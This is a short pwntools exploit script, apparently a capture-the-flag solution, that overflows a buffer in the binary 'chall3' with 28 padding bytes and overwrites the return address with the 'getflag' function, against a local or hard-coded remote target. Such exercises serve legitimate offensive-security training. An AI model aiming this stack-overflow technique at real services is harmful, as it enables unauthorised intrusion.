from pwn import *


elf =context.binary = ELF('./chall3')


def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript='')
    else:
        if args.REMOTE:
            return remote('207.154.255.198',3333)
        else:
            return process()    
    

offset =28


p = start()

pay =flat(
    b'a'*offset,
    elf.sym['getflag'], 
    
)

p.sendline(pay)

p.interactive()
